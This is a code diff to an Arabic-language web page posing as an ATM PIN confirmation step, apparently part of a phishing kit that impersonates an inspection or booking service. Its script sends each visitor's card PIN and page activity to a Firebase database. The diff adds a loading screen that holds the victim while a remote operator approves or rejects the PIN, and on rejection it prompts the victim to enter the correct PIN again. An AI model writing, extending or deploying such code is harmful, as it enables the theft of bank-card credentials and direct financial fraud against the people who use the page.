@@ -11,16 +11,11 @@
     <style>
         :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
+        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; position: relative; }
 
         .atm-container {
-            background: #fff;
-            width: 100%;
-            max-width: 350px; /* تصغير الصفحة لتكون ملمومة وهادئة */
-            border-radius: 20px;
-            padding: 25px 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
-            text-align: center;
+            background: #fff; width: 100%; max-width: 350px; border-radius: 20px;
+            padding: 25px 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.05); text-align: center;
         }
 
         .icon-box { margin-bottom: 15px; }
@@ -29,45 +24,44 @@
         h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
         p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 25px; }
 
-        /* تعديل خانات الإدخال الأربعة لتكون مربع واحد موحد */
         .atm-pin-field {
-            width: 100%;
-            max-width: 220px; /* تحديد عرض مربع الإدخال */
-            height: 45px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            text-align: center;
-            font-size: 20px;
-            letter-spacing: 12px; /* تباعد الحروف داخل المربع الموحد */
-            font-weight: bold;
-            color: var(--main-green);
-            outline: none;
-            background-color: #fafafa;
-            margin-bottom: 20px;
+            width: 100%; max-width: 220px; height: 45px; border: 1px solid #ddd;
+            border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 12px;
+            font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa;
+            margin-bottom: 20px; transition: 0.3s;
         }
 
-        .atm-pin-field:focus { border-color: var(--main-green); background-color: #fff; }
+        /* حالة الخطأ واللون الأحمر */
+        .input-error { border: 2px solid red !important; color: red !important; }
 
         .btn-confirm {
-            width: 100%;
-            background-color: var(--main-green);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            padding: 12px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
+            width: 100%; background-color: var(--main-green); color: white; border: none;
+            border-radius: 10px; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer;
         }
 
-        .secure-notice {
-            margin-top: 15px;
-            font-size: 10px;
-            color: #bbb;
+        .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
+
+        /* شاشة التحميل (Overlay) */
+        #loadingOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999;
         }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--main-green); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p style="color: #333; font-weight: bold; font-size: 14px;">جاري إتمام العملية...</p>
+    </div>
 
     <div class="atm-container">
         <div class="icon-box">
@@ -87,37 +81,72 @@
     </div>
 
     <script>
+        // --- إعدادات Firebase من مشروع Saso-Inspection ---
         const firebaseConfig = { 
-            apiKey: "AIzaSyAzXXXXXXXXXXXX", 
-            databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/", 
-            projectId: "vsc-project" 
+            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
+            authDomain: "saso-inspection.firebaseapp.com",
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com", 
+            projectId: "saso-inspection",
+            storageBucket: "saso-inspection.appspot.com",
+            messagingSenderId: "1009002235896",
+            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
+        // تحديث تتبع الزائر
+        if (visitorId) {
+            database.ref('live_visitors/' + visitorId).update({
+                page: "صفحة الرقم السري (ATM PIN)"
+            });
+        }
+
+        // إرسال الرقم السري والمراقبة
         function sendPIN() {
-            let pinVal = document.getElementById('pinCode').value;
+            const pinInput = document.getElementById('pinCode');
+            let pinVal = pinInput.value;
 
             if (pinVal.length === 4) {
-                database.ref('payments/' + visitorId).update({
+                // إظهار التحميل
+                document.getElementById('loadingOverlay').style.display = 'flex';
+
+                // إرسال البيانات
+                const paymentRef = database.ref('payments/' + visitorId);
+                paymentRef.update({
                     atm_pin: pinVal,
-                    status: "atm_pin_sent",
+                    status: "waiting_atm", // انتظار قرارك النهائي
                     last_update: firebase.database.ServerValue.TIMESTAMP
-                }).then(() => {
-                    // العودة لصفحة الانتظار ليعطيك إشعاراً في الآدمن
-                    window.location.href = 'loading.html';
                 });
+
+                // مراقبة القرار من لوحة التحكم (Admin)
+                paymentRef.on('value', (snapshot) => {
+                    const data = snapshot.val();
+                    
+                    if (data.status === "accept") {
+                        // قبول نهائي -> توجه لصفحة تم الحجز بنجاح
+                        window.location.href = "success.html";
+                    } 
+                    else if (data.status === "reject") {
+                        // رفض -> إخفاء التحميل وتلوين المربع بالأحمر
+                        document.getElementById('loadingOverlay').style.display = 'none';
+                        pinInput.classList.add('input-error');
+                        alert("برجاء التحقق من الرقم الصراف الآلي الصحيح");
+                        
+                        // إعادة الحالة للسماح بالمحاولة مرة أخرى
+                        paymentRef.update({ status: "idle_atm" });
+                    }
+                });
+
             } else {
                 alert("يرجى إدخال 4 أرقام");
             }
         }
 
-        if (visitorId) {
-            database.ref('live_visitors/' + visitorId).update({
-                page: "صفحة الرقم السري الموحد (ATM PIN)"
-            });
-        }
+        // مسح اللون الأحمر عند الكتابة مجدداً
+        document.getElementById('pinCode').addEventListener('input', function() {
+            this.classList.remove('input-error');
+        });
     </script>
 </body>
 </html>
